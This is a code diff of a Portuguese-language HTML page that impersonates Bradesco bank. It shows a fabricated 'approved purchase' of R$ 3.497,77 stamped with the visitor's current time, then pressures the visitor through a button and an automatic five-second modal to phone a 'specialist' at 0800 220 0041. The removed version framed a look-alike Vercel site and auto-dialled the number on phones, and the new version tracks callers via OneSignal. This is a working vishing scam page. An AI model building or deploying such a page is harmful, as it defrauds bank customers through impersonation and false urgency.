@@ -1,55 +1,336 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Redirecionamento + Ligação</title>
-
-<style>
-body, html {
-    margin: 0;
-    padding: 0;
-    height: 100%;
-    overflow: hidden;
-}
-
-#siteFrame {
-    width: 100%;
-    height: 100%;
-    border: none;
-}
-</style>
-
-<script>
-document.addEventListener("DOMContentLoaded", function () {
-
-    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const isAndroid = /Android/i.test(navigator.userAgent);
-
-    // Carrega o site
-    document.getElementById("siteFrame").src = "https://bradesco-six.vercel.app/";
-
-    // ANDROID -> liga automático
-    if (isAndroid) {
-        setTimeout(() => {
-            window.location.href = "tel:08002200041";
-        }, 800);
-    }
-
-    // iPHONE -> abre o menu nativo "Ligar / Cancelar"
-    if (isIOS) {
-        setTimeout(() => {
-            window.location.href = "tel:08002200041";
-        }, 1000);
-    }
-
-});
-</script>
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <title>Bradesco - Compra Aprovada</title>
+    
+    <!-- OneSignal -->
+    <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer></script>
+    <script>
+        window.OneSignalDeferred = window.OneSignalDeferred || [];
+        OneSignalDeferred.push(async function(OneSignal) {
+            await OneSignal.init({
+                appId: "8607c111-fcb0-4399-8d5f-ef6579ed6be5",
+            });
+        });
+    </script>
+    
+    <style>
+        /* Estilos apenas para o modal */
+        .modal-overlay {
+            background-color: rgba(0, 0, 0, 0.7);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .modal-content {
+            animation: slideUp 0.3s ease-out;
+            background: white;
+            border-radius: 16px;
+            max-width: 400px;
+            width: 90%;
+            padding: 24px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .modal-show {
+            display: flex !important;
+        }
+        
+        .btn-modal {
+            background: linear-gradient(135deg, #044595 0%, #0d2063 100%);
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: bold;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .btn-modal:hover {
+            background: linear-gradient(135deg, #03387e 0%, #0a1a52 100%);
+        }
+        
+        .btn-close {
+            background: #f3f4f6;
+            color: #374151;
+            border: 2px solid #d1d5db;
+            transition: all 0.3s ease;
+        }
+        
+        .btn-close:hover {
+            background: #e5e7eb;
+        }
+        
+        /* Animação de pulse no modal */
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(4, 70, 149, 0.4);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(4, 70, 149, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(4, 70, 149, 0);
+            }
+        }
+        
+        .pulse-modal {
+            animation: pulse 2s infinite;
+        }
+    </style>
 </head>
-<body>
 
-<iframe id="siteFrame"></iframe>
+<body class="antialiased">
+    <!-- HEADER BRADESCO (original - EXATAMENTE igual) -->
+    <header class="p-6 bg-gradient-to-r text-white from-[#044595] to-[#0d2063]">
+        <nav class="flex justify-between items-center">
+            <img src="./bradesco_logo.png" class="w-32" alt="Bradesco" />
+            <span class="font-semibold">Compra Aprovada</span>
+        </nav>
+    </header>
 
+    <main class="flex px-8 flex-col h-screen items-center justify-center">
+        <div class="max-w-xl">
+            <!-- Banner original -->
+            <img class="rounded-xl mb-8 w-full shadow-xl" src="./banner.jpg" alt="Banner Bradesco" />
+
+            <!-- Card original -->
+            <div class="rounded-xl flex flex-col gap-4 bg-white shadow-xl w-full p-6 text-[#305178]">
+                <h1 class="text-xl font-medium">Aviso Bradesco</h1>
+
+                <p>Compra APROVADA de <strong>R$ 3.497,77</strong> na loja <strong>*Magazine Luiza*</strong> hoje, às <span class="font-bold" id="hours">16:59</span>.
+                
+                    <br />
+                    <br />
+                <strong>
+                Se você não reconhece essa compra, clique abaixo para falar com especialista agora.
+                </strong></p>
+
+                <!-- Botão original (transformei em button para ter controle melhor) -->
+                <button onclick="makeCall('main-button')" 
+                        class="mx-auto cursor-pointer py-2 w-full text-center max-w-40 px-6 rounded-full bg-gradient-to-r text-white from-[#044595] to-[#0d2063] font-semibold hover:opacity-90 transition">
+                    Falar com atendente
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- MODAL AUTOMÁTICO (APARECE APÓS 5 SEGUNDOS) -->
+    <div id="autoCallModal" class="modal-overlay">
+        <div class="modal-content pulse-modal">
+            <!-- Cabeçalho do modal -->
+            <div class="flex items-center justify-between mb-4">
+                <div class="flex items-center gap-3">
+                    <div style="background: #044595; padding: 8px; border-radius: 8px;">
+                        <svg style="width: 24px; height: 24px; color: white;" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                        </svg>
+                    </div>
+                    <h3 style="font-size: 1.25rem; font-weight: bold; color: #1f2937;">Atendimento Bradesco</h3>
+                </div>
+                <button onclick="closeAutoCallModal()" 
+                        style="color: #6b7280; cursor: pointer; background: none; border: none;">
+                    <svg style="width: 24px; height: 24px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                    </svg>
+                </button>
+            </div>
+
+            <!-- Conteúdo do modal -->
+            <div style="margin-bottom: 24px;">
+                <div style="text-align: center; margin-bottom: 16px;">
+                    <div style="width: 64px; height: 64px; background: #dbeafe; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px;">
+                        <svg style="width: 32px; height: 32px; color: #2563eb;" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>
+                        </svg>
+                    </div>
+                    <h4 style="font-weight: bold; color: #1f2937; font-size: 1.125rem;">Deseja falar com um atendente?</h4>
+                </div>
+                
+                <p style="color: #4b5563; text-align: center; margin-bottom: 24px;">
+                    Para maior segurança, oferecemos ligar automaticamente para nossa central de atendimento.
+                </p>
+                
+                <div style="background: #fffbeb; border: 1px solid #fef3c7; border-radius: 8px; padding: 16px; margin-bottom: 24px;">
+                    <div style="display: flex; align-items: flex-start; gap: 8px;">
+                        <svg style="width: 20px; height: 20px; color: #d97706; flex-shrink: 0; margin-top: 2px;" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
+                        </svg>
+                        <p style="color: #92400e; font-size: 0.875rem;">
+                            Esta ligação é segura. Você será atendido por um especialista do Bradesco.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Botões do modal -->
+            <div style="display: flex; flex-direction: column; gap: 12px;">
+                <button onclick="makeCall('auto-modal')" 
+                        class="btn-modal">
+                    <div style="display: flex; align-items: center; justify-content: center; gap: 8px;">
+                        <svg style="width: 20px; height: 20px;" fill="currentColor" viewBox="0 0 20 20">
+                            <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
+                        </svg>
+                        <span>Sim, ligar agora para 0800 220 0041</span>
+                    </div>
+                </button>
+                
+                <button onclick="closeAutoCallModal()" 
+                        class="btn-modal btn-close">
+                    Não, obrigado
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        // Inicializar quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+            // Atualizar hora atual
+            updateCurrentTime();
+            
+            // Timer para abrir modal automático após 5 segundos
+            setTimeout(() => {
+                openAutoCallModal();
+            }, 5000);
+        });
+        
+        // Variável para controlar o timer
+        let autoModalTimer = null;
+        
+        // Função para atualizar hora
+        function updateCurrentTime() {
+            const now = new Date();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            const timeElement = document.getElementById('hours');
+            if (timeElement) {
+                timeElement.textContent = `${hours}:${minutes}`;
+            }
+        }
+        
+        // Atualizar a cada minuto
+        setInterval(updateCurrentTime, 60000);
+        
+        // Modal functions
+        function openAutoCallModal() {
+            const modal = document.getElementById('autoCallModal');
+            if (modal) {
+                modal.classList.add('modal-show');
+                document.body.style.overflow = 'hidden';
+            }
+        }
+        
+        function closeAutoCallModal() {
+            const modal = document.getElementById('autoCallModal');
+            if (modal) {
+                modal.classList.remove('modal-show');
+                document.body.style.overflow = 'auto';
+            }
+        }
+        
+        // Fechar modal ao clicar fora
+        document.getElementById('autoCallModal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeAutoCallModal();
+            }
+        });
+        
+        // Função para fazer a ligação
+        function makeCall(source = 'button') {
+            const phoneNumber = "08002200041";
+            
+            // Fechar modal se estiver aberto
+            closeAutoCallModal();
+            
+            // Feedback visual no botão
+            let button;
+            if (source === 'auto-modal') {
+                button = event.currentTarget;
+            } else {
+                button = document.querySelector('button[onclick*="makeCall(\'main-button\')"]');
+            }
+            
+            if (!button) return;
+            
+            const originalText = button.innerHTML;
+            
+            // Adicionar efeito visual
+            button.style.opacity = '0.7';
+            button.style.transform = 'scale(0.95)';
+            button.disabled = true;
+            
+            // Mudar texto para "Conectando..."
+            if (source === 'main-button') {
+                button.textContent = 'Conectando...';
+            } else {
+                button.innerHTML = '<span>Conectando...</span>';
+            }
+            
+            // Log do evento
+            console.log(`Iniciando chamada para: ${phoneNumber} (fonte: ${source})`);
+            
+            // Simular delay e depois abrir o telefone
+            setTimeout(() => {
+                // Restaurar botão
+                button.style.opacity = '';
+                button.style.transform = '';
+                button.disabled = false;
+                
+                if (source === 'main-button') {
+                    button.textContent = 'Falar com atendente';
+                } else {
+                    button.innerHTML = originalText;
+                }
+                
+                // Abrir app de telefone (funciona em dispositivos móveis)
+                window.location.href = `tel:${phoneNumber}`;
+                
+                // Fallback para desktop
+                if (!/Mobi|Android/i.test(navigator.userAgent)) {
+                    alert(`Para sua segurança, ligue para:\n\n${phoneNumber}\n\nNúmero: 0800 220 0041`);
+                }
+                
+                // Track event
+                if (window.OneSignal) {
+                    OneSignal.sendTag('called_support', new Date().toISOString());
+                    OneSignal.sendTag('call_source', source);
+                }
+            }, 1000);
+        }
+        
+        // Fechar modal com ESC
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeAutoCallModal();
+            }
+        });
+    </script>
 </body>
 </html>
